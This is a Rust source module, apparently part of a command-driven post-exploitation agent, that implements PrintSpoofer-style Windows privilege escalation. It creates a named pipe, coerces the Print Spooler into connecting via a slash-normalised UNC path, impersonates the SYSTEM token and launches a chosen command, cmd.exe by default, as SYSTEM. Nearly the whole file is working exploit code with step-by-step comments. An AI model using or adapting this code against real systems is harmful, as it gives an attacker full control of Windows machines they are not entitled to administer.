use anyhow::Result;
use serde_json::{json, Value};

use super::CommandHandler;

pub struct ElevateHandler;

impl CommandHandler for ElevateHandler {
    fn execute(&self, args: Value) -> Result<Value> {
        let command = args["command"].as_str().unwrap_or("cmd.exe").to_string();
        execute_elevate(&command)
    }
}

#[cfg(target_os = "windows")]
fn execute_elevate(command: &str) -> Result<Value> {
    if !spooler_running() {
        return Ok(json!({
            "error": "spooler_not_running",
            "hint": "Start Print Spooler service or use a different coercion vector"
        }));
    }

    let pid = impersonate_and_run(command)?;
    Ok(json!({
        "status": "launched",
        "pid": pid,
        "command": command,
        "method": "named_pipe_impersonation"
    }))
}

#[cfg(not(target_os = "windows"))]
fn execute_elevate(_command: &str) -> Result<Value> {
    anyhow::bail!("elevate is only supported on Windows")
}

// Check whether the Print Spooler service (Spooler) is running.
// Returns true if dwCurrentState == SERVICE_RUNNING (4).
#[cfg(target_os = "windows")]
fn spooler_running() -> bool {
    use core::ptr::null;
    use windows_sys::Win32::System::Services::{
        CloseServiceHandle, OpenSCManagerW, OpenServiceW, QueryServiceStatus,
        SC_MANAGER_CONNECT, SERVICE_QUERY_STATUS, SERVICE_RUNNING, SERVICE_STATUS,
    };

    unsafe {
        let scm = OpenSCManagerW(null(), null(), SC_MANAGER_CONNECT);
        if scm == 0 {
            return false;
        }

        let svc_name: Vec<u16> = "Spooler\0".encode_utf16().collect();
        let svc = OpenServiceW(scm, svc_name.as_ptr(), SERVICE_QUERY_STATUS);
        if svc == 0 {
            CloseServiceHandle(scm);
            return false;
        }

        let mut status: SERVICE_STATUS = core::mem::zeroed();
        let ok = QueryServiceStatus(svc, &mut status);

        CloseServiceHandle(svc);
        CloseServiceHandle(scm);

        ok != 0 && status.dwCurrentState == SERVICE_RUNNING
    }
}

// Impersonate the SYSTEM token delivered via a named pipe coerced from the
// Print Spooler (PrintSpoofer slash-normalisation technique), then launch
// `command` in the SYSTEM context.
//
// Steps:
//   1. Create a unique named pipe.
//   2. Trigger the Spooler to connect to it via a printer-change notification
//      using the slash-normalised UNC path (\\HOST/pipe/<id>).
//   3. Impersonate the connecting client (SYSTEM).
//   4. Duplicate the impersonation token into a primary token.
//   5. Revert to original context and launch `command` with the primary token.
#[cfg(target_os = "windows")]
fn impersonate_and_run(command: &str) -> anyhow::Result<u32> {
    use core::mem::zeroed;
    use core::ptr::null;
    use windows_sys::Win32::{
        Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
        Security::{
            DuplicateTokenEx, RevertToSelf,
            SecurityImpersonation, TOKEN_ALL_ACCESS, TokenPrimary,
        },
        Storage::FileSystem::PIPE_ACCESS_DUPLEX,
        System::{
            Pipes::{ConnectNamedPipe, CreateNamedPipeW, ImpersonateNamedPipeClient,
                    PIPE_TYPE_BYTE, PIPE_WAIT},
            Threading::{
                CreateProcessWithTokenW, GetCurrentThread, OpenThreadToken,
                CREATE_NEW_CONSOLE, LOGON_WITH_PROFILE, PROCESS_INFORMATION, STARTUPINFOW,
            },
        },
    };

    let pipe_uuid = uuid::Uuid::new_v4().as_simple().to_string();
    let pipe_name = format!("\\\\.\\pipe\\{pipe_uuid}");
    let pipe_wide: Vec<u16> = pipe_name.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        let pipe = CreateNamedPipeW(
            pipe_wide.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            1,
            512,
            512,
            0,
            null(),
        );

        if pipe == INVALID_HANDLE_VALUE {
            anyhow::bail!("CreateNamedPipeW failed");
        }

        // Coerce Spooler to connect — errors are expected and safe to ignore.
        let _ = coerce_spooler(&pipe_uuid);

        ConnectNamedPipe(pipe, null::<core::ffi::c_void>() as *mut _);

        if ImpersonateNamedPipeClient(pipe) == 0 {
            CloseHandle(pipe);
            anyhow::bail!("ImpersonateNamedPipeClient failed");
        }

        let mut imp_tok: windows_sys::Win32::Foundation::HANDLE = 0;
        if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 0, &mut imp_tok) == 0 {
            RevertToSelf();
            CloseHandle(pipe);
            anyhow::bail!("OpenThreadToken failed");
        }

        let mut prim_tok: windows_sys::Win32::Foundation::HANDLE = 0;
        let dup_ok = DuplicateTokenEx(
            imp_tok,
            TOKEN_ALL_ACCESS,
            null(),
            SecurityImpersonation,
            TokenPrimary,
            &mut prim_tok,
        );

        RevertToSelf();
        CloseHandle(imp_tok);
        CloseHandle(pipe);

        if dup_ok == 0 {
            anyhow::bail!("DuplicateTokenEx failed");
        }

        let mut cmd_w: Vec<u16> = command.encode_utf16().chain(std::iter::once(0)).collect();

        let mut si: STARTUPINFOW = zeroed();
        si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let ok = CreateProcessWithTokenW(
            prim_tok,
            LOGON_WITH_PROFILE,
            null(),
            cmd_w.as_mut_ptr(),
            CREATE_NEW_CONSOLE,
            null(),
            null(),
            &si,
            &mut pi,
        );

        CloseHandle(prim_tok);

        if ok == 0 {
            anyhow::bail!("CreateProcessWithTokenW failed");
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Ok(pi.dwProcessId)
    }
}

// Trigger the Print Spooler to authenticate to our named pipe by opening a
// printer on the target and requesting a change notification with the
// slash-normalised UNC path.
//
// The trick (PrintSpoofer, itm4n 2020): the Spooler accepts UNC paths in the
// form \\HOST/pipe/<name>. When the Spooler normalises the path it converts
// the forward slash to a backslash, turning it into \\HOST\pipe\<name> — a
// valid named pipe path.  The Spooler then connects to the pipe as SYSTEM.
//
// Failures here are non-fatal: ConnectNamedPipe may time out or the coercion
// may succeed via a different notification path.
#[cfg(target_os = "windows")]
fn coerce_spooler(pipe_id: &str) -> anyhow::Result<()> {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "localhost".into());
    // Forward slash in hostname path — Spooler normalises this to a backslash,
    // mapping it to our named pipe: \\HOST\pipe\<pipe_id>.
    let unc = format!("\\\\{hostname}/pipe/{pipe_id}");
    let unc_wide: Vec<u16> = unc.encode_utf16().chain(std::iter::once(0)).collect();

    extern "system" {
        fn OpenPrinterW(name: *const u16, hp: *mut usize, def: *const u8) -> i32;
        fn FindFirstPrinterChangeNotification(
            hp: usize,
            filter: u32,
            opts: u32,
            opts2: *const u8,
        ) -> usize;
        fn ClosePrinter(hp: usize) -> i32;
    }

    unsafe {
        let mut hp: usize = 0;
        let opened = OpenPrinterW(unc_wide.as_ptr(), &mut hp, core::ptr::null());
        if opened != 0 && hp != 0 {
            // PRINTER_CHANGE_PRINT_JOB = 0x100
            FindFirstPrinterChangeNotification(hp, 0x100, 0, core::ptr::null());
            ClosePrinter(hp);
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn default_command_is_cmd() {
        use super::ElevateHandler;
        use crate::commands::CommandHandler;
        use serde_json::json;

        // On non-Windows this always returns an error.
        // The test just verifies it doesn't panic.
        let _ = ElevateHandler.execute(json!({}));
    }

    #[test]
    fn compiles_on_host() {}
}
